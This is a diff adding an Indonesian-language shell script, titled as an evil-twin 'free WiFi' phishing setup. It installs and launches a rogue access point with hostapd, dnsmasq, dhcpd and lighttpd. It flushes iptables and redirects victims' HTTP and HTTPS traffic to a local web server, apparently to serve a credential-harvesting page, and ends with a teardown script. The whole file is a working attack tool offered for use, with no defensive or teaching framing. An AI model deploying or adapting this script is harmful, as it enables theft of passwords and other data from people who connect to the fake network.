@@ -1,0 +1,93 @@
+#======================================================#
+# SCRIPT MENJALANKAN FISHING FREE-WIFI DENGAN EVILTWIN # 
+#------------ hostapd dnsmasq lighttpd dhcpd ----------#
+#======================================================#
+#------------------- BY WONGGANTENG -------------------#
+#--------------- ©️ 2025 Wonggantengg -----------------#
+#======================================================#
+
+# Update sistem terlebih dahulu
+sudo apt update
+
+# Install paket-paket utama
+sudo apt install -y hostapd isc-dhcp-server dnsmasq lighttpd iptables net-tools procps aircrack-ng
+
+# Untuk monitoring jaringan
+sudo apt install -y wireless-tools iw rfkill tcpdump netfilter-persistent iptables-persistent
+
+
+==============================
+==============================
+
+#!/bin/bash
+sudo airmon-ng check kill
+sudo ifconfig wlan0 down
+sudo ifconfig wlan0 192.169.1.1 netmask 255.255.255.0 up
+sudo sysctl -w net.ipv4.ip_forward=1
+
+sudo iptables -F
+sudo iptables -X
+sudo iptables -t nat -F
+sudo iptables -t nat -X
+
+sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 80
+sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 80
+
+sudo iptables -A INPUT -i wlan0 -p udp --dport 53 -j ACCEPT
+sudo iptables -A INPUT -i wlan0 -p tcp --dport 80 -j ACCEPT
+sudo iptables -A INPUT -i wlan0 -p tcp --dport 443 -j ACCEPT
+
+
+# Perbaiki permission file dhcpd.conf
+sudo chmod 644 /wifi/conf/dhcpd.conf
+sudo chown root:root /wifi/conf/dhcpd.conf
+
+# Buat directory dan file leases
+sudo mkdir -p /var/lib/dhcp
+sudo touch /var/lib/dhcp/dhcpd.leases
+sudo chown root:root /var/lib/dhcp/dhcpd.leases  #root:root
+
+# Buat symlink (optional)
+sudo cp /wifi/conf/wifi-dhcpd.conf /etc/dhcp/wifi-dhcpd.conf
+sudo ln -sf /wifi/conf/wifi-dhcpd.conf /etc/dhcp/wifi-dhcpd.conf
+
+sudo ln -sf /etc/dhcp/dhcpd.conf /wifi/conf/dhcpd.conf
+
+==============================
+==============================
+
+sudo hostapd /wifi/conf/hostapd.conf &
+sudo dnsmasq -C /wifi/conf/dnsmasq.conf &
+sudo lighttpd -D -f /wifi/conf/lighttpd.conf &
+sudo dhcpd -d -cf /wifi/conf/dhcpd.conf wlan0 &
+
+sudo hostapd /wifi/conf/hostapd.conf
+sudo dnsmasq -C /wifi/conf/dnsmasq.conf
+sudo lighttpd -D -f /wifi/conf/lighttpd.conf
+sudo dhcpd -d -cf /wifi/conf/dhcpd.conf wlan0
+sudo dhcpd -d -cf /wifi/conf/wifi-dhcpd.conf wlan0
+
+sudo hostapd /wifi/conf/hostapd.conf
+sudo dnsmasq -C /wifi/conf/dnsmasq.conf
+sudo lighttpd -D -f /wifi/conf/lighttpd.conf
+sudo dhcpd -d -cf /etc/dhcp/dhcpd.conf wlan0
+
+
+==============================
+==============================
+
+
+#!/bin/bash
+sudo pkill lighttpd
+sudo pkill dnsmasq
+sudo pkill hostapd
+sudo pkill dhcpd
+
+sudo iptables -F
+sudo iptables -X
+sudo iptables -t nat -F
+sudo iptables -t nat -X
+
+sudo ifconfig wlan0 down
+sudo sysctl -w net.ipv4.ip_forward=0
+sudo systemctl restart NetworkManager
